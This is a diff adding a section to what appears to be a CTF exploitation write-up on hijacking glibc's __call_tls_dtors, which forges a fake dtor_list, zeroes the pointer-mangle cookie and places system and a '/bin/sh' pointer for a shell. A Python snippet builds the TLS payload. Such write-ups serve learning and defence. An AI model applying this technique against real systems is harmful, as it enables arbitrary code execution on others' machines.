@@ -674,6 +674,31 @@ Dump of assembler code for function __GI___call_tls_dtors:
 ```
 while loop check is at +24,  and rbx contains negative value, fs:rbx is the address of struct dtor_list.We have to null the fs:0x30(random_value) cuz then at +44 xor operation will have no effect. So overwriting func with with system<<17 and then obj with address of "bin/sh" will give the shell.
 
+### Update
+I think I'll just complete it. I am making exploit locally with ASLR off so the offset will be different from Docker.
+This is the tls section
+![TLS](../../assets/images/tls_fsop.png "tls")
+
+so to get shell we have to forge dtor_list and currently there is none(see the checks +24),
+so we will put a pointer there which will be our fake dtor_list. Also the ptr mangle cookie should be zero to null the side-effect of xor operation.
+
+This is after overwriting stuff..
+![TLS](../../assets/images/after.png "tls")
+
+
+
+```python
+tls_struct =pack(libc.address+0x3bd6e8+0x8)
+tls_payload = tls_struct
+tls_payload+=pack(libc.sym.system<<17)
+tls_payload+=pack(libc.address+0x1dbcba)
+tls_payload+=pack(0x0)*0x8
+tls_payload+=pack(libc.address+0x3bd740)
+tls_payload+=pack(libc.address+0x3be160)
+tls_payload+=pack(libc.address+0x3bd740)
+tls_payload+=pack(0x0)*0x4
+```
+
 
 ### Aftermath
 
